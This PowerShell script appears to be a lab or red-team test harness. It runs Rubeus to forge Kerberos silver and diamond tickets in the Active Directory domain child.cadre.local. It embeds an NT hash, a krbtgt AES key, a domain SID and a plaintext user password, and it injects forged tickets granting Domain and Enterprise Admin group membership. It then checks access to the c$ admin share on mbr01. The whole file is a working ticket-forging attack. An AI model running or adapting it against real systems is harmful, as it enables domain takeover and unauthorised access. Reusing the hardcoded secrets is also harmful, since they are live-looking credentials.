# WT011/012 v3: Start-Process redirects for reliable Rubeus output
$ErrorActionPreference = 'Continue'
$Rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$childSid = 'S-1-5-21-2616196951-1941128886-767624593'
$mbr01Nt = '3a01c6cd54eab57a78377d0ef10cef3f'
$krbtgtAes = 'd64da42f8e5caeeb725d009b615eb98f4f05b121376ca38c1e1ee9dcb553d9d2'
$dc = 'dc02.child.cadre.local'
$out = 'C:\Tools\ADTools'

function Run-Rubeus([string[]]$ArgsList, [string]$StdOut, [string]$StdErr) {
    $p = Start-Process -FilePath $Rubeus -ArgumentList $ArgsList -RedirectStandardOutput $StdOut -RedirectStandardError $StdErr -NoNewWindow -Wait -PassThru
    Write-Output "RC=$($p.ExitCode)"
}

klist purge 2>&1 | Out-Null

Write-Output '===== WT011 SILVER ====='
Run-Rubeus @('silver','/service:cifs/mbr01.child.cadre.local',"/rc4:$mbr01Nt","/sid:$childSid",'/user:Administrator','/id:500','/group:512,513,518,519,520','/domain:child.cadre.local','/ptt') "$out\wt011-s.out" "$out\wt011-s.err"
Get-Content "$out\wt011-s.out" -ErrorAction SilentlyContinue | Select-Object -First 30 | ForEach-Object { Write-Output "SILVER_OUT|$_" }
Get-Content "$out\wt011-s.err" -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object { Write-Output "SILVER_ERR|$_" }
cmd.exe /c "dir \\mbr01.child.cadre.local\c$ 2>&1" | Select-Object -First 8 | ForEach-Object { Write-Output "SILVER_SMB|$_" }
klist 2>&1 | Select-String -Pattern 'cifs|mbr01' | Select-Object -First 4 | ForEach-Object { Write-Output "SILVER_KERB|$_" }
klist purge 2>&1 | Out-Null

Write-Output '===== WT012 DIAMOND ====='
Remove-Item "$out\wt012-legit-tgt.kirbi" -ErrorAction SilentlyContinue
Run-Rubeus @('asktgt','/user:analyst_t1','/password:T13r_An@lyst!','/domain:child.cadre.local',"/dc:$dc","/outfile:$out\wt012-legit-tgt.kirbi") "$out\wt012-t.out" "$out\wt012-t.err"
Get-Content "$out\wt012-t.out" -ErrorAction SilentlyContinue | Select-String -Pattern 'written|ServiceName|error|KRB' | Select-Object -First 5 | ForEach-Object { Write-Output "DIAM_TGT|$_" }
if (Test-Path "$out\wt012-legit-tgt.kirbi") {
    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$out\wt012-legit-tgt.kirbi"))
    Write-Output "TGT_B64_LEN $($b64.Length)"
    Run-Rubeus @('diamond',"/ticket:$b64",'/krbtgt:'+$krbtgtAes,'/enctype:aes','/service:cifs/mbr01.child.cadre.local',"/dc:$dc",'/ptt') "$out\wt012-d.out" "$out\wt012-d.err"
    Get-Content "$out\wt012-d.out" -ErrorAction SilentlyContinue | Select-Object -First 25 | ForEach-Object { Write-Output "DIAM_OUT|$_" }
    Get-Content "$out\wt012-d.err" -ErrorAction SilentlyContinue | Select-Object -First 8 | ForEach-Object { Write-Output "DIAM_ERR|$_" }
    cmd.exe /c "dir \\mbr01.child.cadre.local\c$ 2>&1" | Select-Object -First 8 | ForEach-Object { Write-Output "DIAM_SMB|$_" }
    klist 2>&1 | Select-String -Pattern 'cifs|mbr01' | Select-Object -First 4 | ForEach-Object { Write-Output "DIAM_KERB|$_" }
}
klist purge 2>&1 | Out-Null
Write-Output 'WT011_012_V3_DONE'
